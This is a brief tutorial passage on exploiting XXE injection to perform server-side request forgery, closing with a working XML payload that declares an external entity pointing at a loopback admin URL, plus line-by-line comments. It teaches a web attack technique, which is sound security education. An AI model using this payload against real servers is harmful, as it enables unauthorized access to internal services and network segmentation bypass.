Leveraging XXE for Server-Side Request Forgery (SSRF)

XXE can be exploited to perform Server-Side Request Forgery (SSRF), where the XML parser is tricked into making HTTP requests to internal or external URLs on behalf of the application.

What is SSRF?

SSRF allows an attacker to cause the server-side application to make requests to an arbitrary domain, potentially accessing internal network resources.

Internal Network Access

By pointing an external entity to an internal IP or hostname, the vulnerable server can be forced to interact with services not directly exposed to the internet.

Key Takeaway

XXE-driven SSRF enables attackers to bypass network segmentation and interact with internal services, potentially leading to deeper system compromise.

XXE Payload for SSRF
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!-- Declares an external entity 'xxe' pointing to an internal URL -->
  <!ENTITY xxe SYSTEM "http://127.0.0.1/admin">
]>
<data>&xxe;</data>

<!-- Explanation: -->
<!-- 1. The 'xxe' entity is defined to load content from the local admin endpoint. -->
<!-- 2. When the XML parser processes &xxe;, it makes an HTTP request -->
<!--    to http://127.0.0.1/admin from the server's perspective. -->
<!-- 3. The response from the internal admin page might be returned -->
<!--    in the application's output, or trigger actions on the server. -->
